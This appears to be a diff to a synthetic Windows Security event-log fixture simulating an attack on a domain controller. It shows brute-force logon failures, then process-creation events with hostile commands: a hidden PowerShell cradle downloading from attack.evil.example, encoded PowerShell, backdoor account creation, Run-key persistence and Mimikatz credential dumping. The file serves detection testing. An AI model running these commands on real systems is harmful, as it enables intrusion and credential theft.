@@ -17,7 +17,7 @@
     <Provider Name="Microsoft-Windows-Security-Auditing"/>
     <EventID>4625</EventID>
     <Level>0</Level>
-    <TimeCreated SystemTime="2026-08-25T12:00:05.000Z"/>
+    <TimeCreated SystemTime="2026-08-25T12:00:04.000Z"/>
     <Computer>DC01.corp.local</Computer>
   </System>
   <EventData>
@@ -29,13 +29,112 @@
 <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
   <System>
     <Provider Name="Microsoft-Windows-Security-Auditing"/>
-    <EventID>4624</EventID>
+    <EventID>4625</EventID>
     <Level>0</Level>
-    <TimeCreated SystemTime="2026-08-25T12:00:09.000Z"/>
+    <TimeCreated SystemTime="2026-08-25T12:00:07.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">sa</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="Status">0xC000006A</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:00:10.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">backup_admin</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="Status">0xC000006A</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:00:13.000Z"/>
     <Computer>DC01.corp.local</Computer>
   </System>
   <EventData>
     <Data Name="TargetUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="Status">0xC000006A</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:00:16.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">svc_scan</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="Status">0xC000006A</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:00:19.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="Status">0xC000006A</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4625</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:00:22.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">jenkins</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="Status">0xC000006A</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4624</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:00:40.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="TargetUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+    <Data Name="LogonType">3</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:01:05.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -enc VABlAHMAdAAtAE4AZQB0AFMAZQBzAHMAaQBvAG4AIAAxADIANAAuAC4AMAAuADIAMAAwACAAOAA4ADgAOAAgAC0AUABhAHMAcwBUAGgAcgB1ADsA</Data>
+    <Data Name="SubjectUserName">administrator</Data>
     <Data Name="IpAddress">185.23.45.67</Data>
   </EventData>
 </Event>
@@ -44,11 +143,110 @@
     <Provider Name="Microsoft-Windows-Security-Auditing"/>
     <EventID>4688</EventID>
     <Level>0</Level>
-    <TimeCreated SystemTime="2026-08-25T12:01:00.000Z"/>
+    <TimeCreated SystemTime="2026-08-25T12:01:22.000Z"/>
     <Computer>DC01.corp.local</Computer>
   </System>
   <EventData>
-    <Data Name="NewProcessName">powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==</Data>
+    <Data Name="NewProcessName">powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attack.evil.example/init.ps1')</Data>
     <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:01:39.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -enc SQBFAFgAKAAoAFMAZQBuAGQASwBlAHkAQwBsAGkAZQBuAHQAKQAuAEMAbwBuAG4AZQBjAHQAKAAxADgANAAuADIAMwAuADQANQAuADYANwAsADQANAA0ADQAKQAKAA==</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:02:00.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -enc AEMAbwBwAHkALQBJAHQAZQBtACAAcwBlAHIAIABuAGEAdAB2AGwAawAoAFYAYQBwAG0AYQB0AGUAcgApACAAbgBlAHMAYwBhAG4AIABuAGEAdgB0AGwAawAoAEUAbgB0AGUAcgBwAHIAaQBzAGUAKQA7AA==</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:02:11.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -Command "$k=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('net user pwnaddy P@ssw0rd /add')); powershell -enc $k"</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:02:20.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /t REG_SZ /d C:\Users\Public\runtime.exe</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:02:30.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -enc SQBmACgAcwBwAEIAYQBjAGsAdQBwAEMAbABpAGUAbgB0ACkALgBUAHIAYQBuAHMAZgBlAHIAKAAxADgANAAuADIAMwAuADQANQAuADYANwAsADIANAA0ADQAKQAKAA==</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:02:40.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -enc IABpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdABOAGUAdABXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAC4AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwByAHMALgBwAHMAMQAnACkA</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
+  </EventData>
+</Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing"/>
+    <EventID>4688</EventID>
+    <Level>0</Level>
+    <TimeCreated SystemTime="2026-08-25T12:03:00.000Z"/>
+    <Computer>DC01.corp.local</Computer>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">powershell.exe -WindowStyle Hidden -Command Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'</Data>
+    <Data Name="SubjectUserName">administrator</Data>
+    <Data Name="IpAddress">185.23.45.67</Data>
   </EventData>
 </Event>
